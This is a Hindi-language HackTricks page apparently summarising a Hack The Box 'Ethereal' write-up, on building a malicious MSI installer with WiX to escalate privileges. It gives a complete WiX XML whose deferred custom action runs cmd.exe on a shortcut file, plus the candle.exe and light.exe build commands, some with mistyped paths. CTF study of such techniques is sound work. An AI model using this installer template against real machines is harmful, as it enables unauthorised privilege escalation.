<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** का** **अनुसरण** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** द्वारा PRs सबमिट करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

# दुरुपयोगी MSI बनाना और रूट प्राप्त करना

MSI इंस्टॉलर का निर्माण wixtools का उपयोग करके किया जाएगा, विशेष रूप से [wixtools](http://wixtoolset.org) का उपयोग किया जाएगा। यह उल्लेखनीय है कि विकल्पिक MSI निर्माताओं का प्रयास किया गया, लेकिन इस विशेष मामले में वे सफल नहीं रहे।

wix MSI के उपयोग के उदाहरणों की व्यापक समझ के लिए, [इस पृष्ठ](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) की सलाह दी जाती है। यहाँ, आपको wix MSI के उपयोग को दर्शाने वाले विभिन्न उदाहरण मिलेंगे।

उद्देश्य एक MSI उत्पन्न करना है जो lnk फ़ाइल को क्रियान्वित करेगा। इसे प्राप्त करने के लिए, निम्नलिखित XML कोड का उपयोग किया जा सकता है ([यहाँ से xml](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)):
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
**यह जरूरी है कि Package तत्व में InstallerVersion और Compressed जैसी गुणवत्ताएं होती हैं, जो स्थापक का संस्करण और पैकेज का यह दर्शाती है कि क्या पैकेज संपीड़ित है या नहीं।

निर्माण प्रक्रिया candle.exe का उपयोग करने के साथ संबंधित है, जो wixobject को msi.xml से उत्पन्न करने के लिए wixtools से एक उपकरण है। निम्नलिखित कमांड को निष्पादित किया जाना चाहिए:**
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
इसके अतिरिक्त, पोस्ट में एक छवि भी दी गई है, जो कमांड और उसके आउटपुट को दर्शाती है। आप इसे दृश्य मार्गदर्शन के लिए संदर्भित कर सकते हैं।

इसके अतिरिक्त, wixtools से एक और उपकरण light.exe का उपयोग किया जाएगा, जिससे wixobject से MSI फ़ाइल बनाई जाएगी। निष्पादित करने के लिए कमांड निम्नलिखित है:
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
## संदर्भ
* [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
* [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)


<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा **पीआर जमा करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
